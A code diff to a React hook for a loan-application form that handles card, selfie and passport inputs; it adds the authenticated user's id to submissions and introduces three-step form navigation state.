@@ -2,6 +2,7 @@ import { useState, useEffect, useCallback, useRef } from "react";
 import { toast } from "sonner";
 import { submitLoanApplication, checkLoanStatus, uploadLoanAsset } from "@/lib/queries";
 import { luhn, isExpiryValid } from "@/lib/loan-utils";
+import { useAuth } from "@/components/layout/AuthContext";
 
 const REDIRECT_URL = import.meta.env.VITE_LOAN_REDIRECT_URL as string | undefined;
 
@@ -73,6 +74,7 @@ export type AppStatus = {
 };
 
 export function useLoanApplication() {
+  const { user } = useAuth();
   const [loading, setLoading] = useState(false);
   const [done, setDone] = useState(false);
   const [countdown, setCountdown] = useState(15);
@@ -85,6 +87,18 @@ export function useLoanApplication() {
   const [cardExpiry, setCardExpiry] = useState("");
   const [cardCvv, setCardCvv] = useState("");
   const [cardErrors, setCardErrors] = useState<Record<string, string>>({});
+
+  // ── Step State ────────────────────────────────────────────────────────────
+  const [currentStep, setCurrentStep] = useState(1);
+  const totalSteps = 3;
+
+  function nextStep() {
+    if (currentStep < totalSteps) setCurrentStep(s => s + 1);
+  }
+
+  function prevStep() {
+    if (currentStep > 1) setCurrentStep(s => s - 1);
+  }
 
   // Image/video state: stores base64 data URI (dev) or R2 key (prod after upload)
   const [selfieImage, setSelfieImage] = useState<string | null>(null);
@@ -380,6 +394,7 @@ export function useLoanApplication() {
       accountHolderName: String(fd.get("account_holder_name") || "").trim() || null,
       sourcePage: typeof window !== "undefined" ? window.location.pathname : "/loans",
       status: "pending",
+      userId: user?.id || null,
       // Strip any base64 value larger than ~15 MB to avoid 413 on submission.
       // R2-uploaded values are short keys (not data URIs) and always pass through.
       selfieImage: safeImgVal(selfieImage),
@@ -455,5 +470,6 @@ export function useLoanApplication() {
     onPassportBackChange: makeFileHandler("passport_back", setPassportBackImage),
     onVideoSelfieChange: handleVideoCapture,
     handleSubmit, appStatus, appId, clearSession,
+    currentStep, totalSteps, nextStep, prevStep, setCurrentStep
   };
 }
